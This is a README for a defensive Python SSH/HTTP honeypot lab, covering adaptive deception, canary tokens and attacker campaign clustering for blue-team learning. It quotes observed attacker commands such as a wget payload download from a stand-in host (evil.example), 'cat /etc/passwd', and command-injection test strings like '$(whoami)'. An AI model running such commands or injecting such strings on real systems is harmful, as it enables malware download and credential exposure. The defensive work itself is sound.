# Decoy Honeypot Lab — Low-Interaction SSH Honeypot

![Python](https://img.shields.io/badge/python-3.9%2B-blue)
![License](https://img.shields.io/badge/license-MIT-green)
![Dependencies](https://img.shields.io/badge/dependencies-stdlib%20only-brightgreen)
![Tests](https://img.shields.io/badge/tests-27%20passing-brightgreen)
![MITRE](https://img.shields.io/badge/MITRE-T1110%20%7C%20T1059%20%7C%20T1078-red)
![Version](https://img.shields.io/badge/version-v2.0%20Decoy%20Fabric-purple)

A **low-interaction SSH honeypot in pure Python (stdlib only)** that safely
attracts and logs automated SSH attacks in an isolated lab — no real shell,
no real login, no real risk to the host. It captures the exact data a SOC
analyst needs: which IPs are scanning, which credentials bots try, and what
commands they run after "login". Then it turns that raw log into a
SOC-style attacker report.

Built for blue-team learning, SOC interview prep, and threat-intel practice.

## v2.0 — Advanced: Adaptive Deception Fabric

> **v1 is a tutorial honeypot. v2 is not.** v1 pretends to be one fixed
> Ubuntu box and logs what happened. v2 — the **Decoy Fabric** — watches
> *how* an attacker behaves, changes what it pretends to be in response,
> plants fake secrets to learn what they want to steal, and groups
> sessions into *campaigns* instead of counting IPs.

Most honeypots answer one question: "who knocked?" Decoy Fabric answers
three that a static decoy cannot:

1. **What tool is this?** — `src/fingerprint.py` classifies a session
   from tempo, password order, command sequence and breadth: Hydra
   (fast, sequential dictionary, no commands), manual (slow, typos,
   exploratory `ls`/`cat`), scanner (no login), sqlmap-like (SQL in
   the stream), botnet (the same password list from ≥3 IPs).
2. **What should the decoy become?** — `src/adaptive.py` +
   `config/adaptive_policy.json` change the deception per fingerprint:
   Hydra gets an old Debian banner, a 2 s tarpit delay and a fake
   account lockout after 3 attempts; a manual actor gets a rich
   filesystem with canary files; a scanner gets a fake open-ports
   list instead of a shell. Policy is config-driven — edit the JSON,
   restart, no code change.
3. **Is this one actor or many?** — `src/clustering.py` groups
   sessions by password-list Jaccard similarity + command-set
   similarity + fingerprint, so a botnet across five IPs shows up as
   **one campaign**, not five unrelated IPs.

Plus `src/canary.py`: fake AWS keys, database passwords, a fake
private key and fake documents planted in the fake filesystem (and
in HTTP HTML comments). When an attacker `cat`s one, a HIGH-severity
`canary_accessed` event is logged — that is exfiltration detection,
not just login logging. All canary values are fake by construction
(`AKIA…EXAMPLE` pattern), never real credentials.

And `http_honeypot.py`: a second decoy surface — a fake admin login
page on port 8080 that logs submitted credentials and serves a fake
dashboard, with canary tokens in its HTML comments.

### v2 campaign result (from `logs/sample_campaign.jsonl` — 12 sessions)

| Campaign | Likely type | Sessions | IPs | Shared passwords |
|---|---|---|---|---|
| CAMP-01 | botnet (conf 0.90) | 10 | 5 — 203.0.113.11–15 | 123456, password, admin, root, qwerty |
| CAMP-02 | manual (conf 0.85) | 2 | 1 — 198.51.100.77 | Winter2026! (unique, not in the botnet list) |

The two campaigns are separated by the clustering, not by IP count:
the botnet sessions share an identical 5-password list (Jaccard 1.0)
and no commands; the manual sessions share exploratory commands,
a typo (`lss`), slow tempo, and 2 canary accesses.

```bash
# v2 demo — no internet needed
python3 honeypot_v2.py --adaptive          # terminal 1, 127.0.0.1:2222
python3 http_honeypot.py                   # terminal 1b, 127.0.0.1:8080
python3 simulate_attack.py                 # terminal 2
python3 analyze_v2.py --log logs/sample_campaign.jsonl \
    --output campaign_report.html --json campaigns.json
# [+] Sessions: 12 | Campaigns: 2 ({'botnet': 1, 'manual': 1}) |
#     Canary accesses: 2
```

**Note — the lockout *is* the demo.** `simulate_attack.py` fires 15
fast dictionary guesses from one IP, so v2 fingerprints it as Hydra
after 3 attempts and fake-locks the account: in a live run that is
15 login attempts logged, 13 `lockout` events, and only the first 2
sessions reaching the shell. To demo the full fake shell instead,
run `python3 honeypot_v2.py --no-adaptive` (v1 behaviour), or restart
the honeypot to clear its per-IP memory.

| Component | File | Role |
|---|---|---|
| v2 SSH honeypot | `honeypot_v2.py` | Adaptive SSH decoy, per-IP memory, tarpit + lockout |
| HTTP honeypot | `http_honeypot.py` | Fake admin login on 8080, credential logging, canaries in HTML comments |
| Fingerprinting | `src/fingerprint.py` | Hydra / manual / scanner / sqlmap / botnet classification |
| Adaptive policy | `src/adaptive.py` + `config/adaptive_policy.json` | Config-driven banner / delay / lockout / filesystem per fingerprint |
| Canaries | `src/canary.py` | Fake AWS keys, DB passwords, private key, documents |
| Clustering | `src/clustering.py` | Campaign grouping by password + command similarity |
| v2 analyzer | `analyze_v2.py` | Campaign report (`campaign_report.html` + `campaigns.json`) |
| v1 (kept) | `honeypot.py`, `analyze.py` | Original static honeypot — still works unchanged |

## What it is

A decoy SSH server. It listens on TCP **2222** (deliberately *not* port 22),
sends a fake OpenSSH banner, asks for a username and password, logs both,
then drops the attacker into a **fake shell** that answers a handful of
harmless commands (`ls`, `pwd`, `whoami`, `id`, `uname`…) from a hard-coded
lookup table. Anything else gets `command not found`.

Attacker input is **never executed** — no `os.system`, no `subprocess`,
no `eval`, no `exec`. There is no account to log into and no shell to
escape from. The honeypot's only job is to watch, log, and report.

## Why honeypots matter for SOC / blue team in 2026

Automated SSH brute-forcing never stopped — botnets still scan the whole
internet for port 22 and try `root/123456` millions of times a day. A
honeypot is the cheapest way to study that traffic safely:

- **Early warning** — the usernames, passwords and IPs hitting your decoy
  are the same ones hitting production. Block them before they find a
  real server.
- **TTP collection** — post-login commands (`wget …/x.sh`, `cat /etc/passwd`,
  `ps aux`) reveal attacker playbooks you can map to MITRE ATT&CK.
- **Detection engineering** — real honeypot logs are the ground truth for
  writing and tuning SIEM rules (e.g. "5 failed SSH logins from one IP
  in 60 seconds").
- **Safe practice** — junior analysts can triage real attacker behaviour
  without ever touching a production incident.

## Architecture

```
                    ┌──────────────────────────────┐
  attacker / bot    │  honeypot.py  (port 2222)    │
  ────────────────► │  fake banner → fake login →  │
                    │  fake shell (canned output)  │
                    └──────┬───────────────────────┘
                           │ logs every event
              ┌────────────┴────────────┐
              ▼                         ▼
  logs/honeypot.jsonl         logs/honeypot.db
  (JSON Lines, SIEM-ready)    (SQLite, queryable)
              │                         │
              └────────────┬────────────┘
                           ▼
                    analyze.py
              ┌────────────┴────────────┐
              ▼                         ▼
         report.html              summary.json
   (SOC attacker report,       (machine-readable
    CSS bar charts, no JS)      stats + MITRE map)
```

| Component | File | Role |
|---|---|---|
| Honeypot | `honeypot.py` | TCP listener, fake banner/login/shell, threaded |
| Logger | `src/logger.py` | JSONL + SQLite writes, per-IP stats, MITRE mapping |
| Analyzer | `analyze.py` | Reads the log, writes `report.html` + `summary.json` |
| Simulator | `simulate_attack.py` | Safe localhost brute-force demo (no internet needed) |
| Tests | `tests/test_honeypot.py` + `tests/test_v2.py` | `unittest`, 27 tests (9 v1 + 18 v2) |

## Install

```bash
git clone https://github.com/<you>/decoy-honeypot.git
cd decoy-honeypot
# No dependencies — Python 3.9+ standard library only.
python3 --version
```

## Usage

**1. Start the honeypot** (terminal 1):

```bash
python3 honeypot.py
# [+] Decoy Honeypot Lab listening on 127.0.0.1:2222
# [+] Banner: SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6
```

Listen on all interfaces in a lab VM only: `python3 honeypot.py --host 0.0.0.0 --port 2222`

**2. Simulate an attack** (terminal 2 — localhost only, no internet):

```bash
python3 simulate_attack.py
# [+] Simulating 15 login attempts against 127.0.0.1:2222
#   [attempt] root:123456  -> logged
#   [attempt] admin:admin  -> logged
#   ...
```

**3. Generate the attacker report:**

```bash
python3 analyze.py --log logs/honeypot.jsonl --output report.html --json summary.json
# [+] Read 135 events from logs/honeypot.jsonl
# [+] Sessions: 15 | Login attempts: 15 | Commands: 90 | Unique IPs: 1
# [+] Wrote report.html and summary.json
```

Then open `report.html` in a browser. No internet needed — the charts are
plain HTML/CSS bars, no JavaScript, no external resources.

**Try it without running anything** — a pre-captured log is included:

```bash
python3 analyze.py --log logs/sample_honeypot.jsonl --output report.html --json summary.json
```

## Expected output

A raw log line (`logs/honeypot.jsonl`):

```json
{"timestamp": "2026-11-21T02:30:00+00:00", "event": "login_attempt",
 "session_id": "a1b2c3d4", "src_ip": "203.0.113.42", "src_port": 51234,
 "username": "root", "password": "123456"}
```

`summary.json` (excerpt):

```json
{
  "total_sessions": 80,
  "total_login_attempts": 129,
  "total_commands": 178,
  "unique_ips": 15,
  "top_passwords": [["123456", 31], ["admin", 15], ["oracle", 9]],
  "mitre": {
    "T1110.001": "Brute Force: Password Guessing (129 login attempts)"
  }
}
```

### Sample attacker report (from `logs/sample_honeypot.jsonl` — 80 sessions)

| Metric | Value |
|---|---|
| Sessions | 80 |
| Login attempts | 129 |
| Commands tried | 178 |
| Unique source IPs | 15 |
| Top username | `root` (34 attempts) |
| Top password | `123456` (31 attempts) |
| Most aggressive IP | `45.148.10.32` (25 attempts) |
| Most common post-login command | `wget http://evil.example/x.sh` (14× — malware download attempt) |
| MITRE ATT&CK | T1110.001 Password Guessing · T1059 Command Interpreter · T1078 Valid Accounts (0 succeeded) |

The pattern is the classic one: bots try `root/123456` first, then
`admin/admin`, then fingerprint the host (`id`, `ps aux`, `uname -a`) and
try to download a payload. None of it ever touches a real system here.

## Safety warnings

> **Run this only in an isolated lab / VM on a private network.**

- Default bind is `127.0.0.1` — it is not reachable from other machines
  unless you pass `--host 0.0.0.0`. Do that only in an isolated lab.
- **Never expose a honeypot to the internet** without understanding the
  risk: it invites attention by design, and a misconfigured host next to
  it becomes a target.
- Change the port, firewall the host, and keep the lab VM separate from
  anything that holds real data or credentials.
- The passwords in `logs/` are attacker-supplied guesses, not real
  credentials. Treat log files as untrusted data — don't paste them into
  other systems blindly.
- This is a **low-interaction** honeypot for learning and detection. It is
  not a production deception platform (see Roadmap).

## Tests

```bash
python3 -m unittest discover -s tests -v
# Ran 27 tests in ~2s — OK (9 v1 + 18 v2)
```

Tests cover: the fake SSH banner, canned shell output, no shell escape
(injection strings like `ls; id` and `$(whoami)` are rejected, never run),
JSONL + SQLite logging, per-IP statistics, a full live session against a
real listener on a random localhost port, and analyzer counts / report
rendering (including "no `<script>` in the report").

## Roadmap

- [x] HTTP honeypot (fake login page / WordPress admin) alongside SSH — done in v2.0
- [x] Adaptive deception + campaign clustering — done in v2.0
- [ ] Geo-IP enrichment of source IPs (offline MaxMind DB)
- [ ] Telnet / FTP low-interaction modules
- [ ] Live dashboard + alerting (e.g. webhook on >10 attempts from one IP)
- [ ] Export to Sigma rule from observed TTPs

## License

MIT — see [LICENSE](LICENSE).
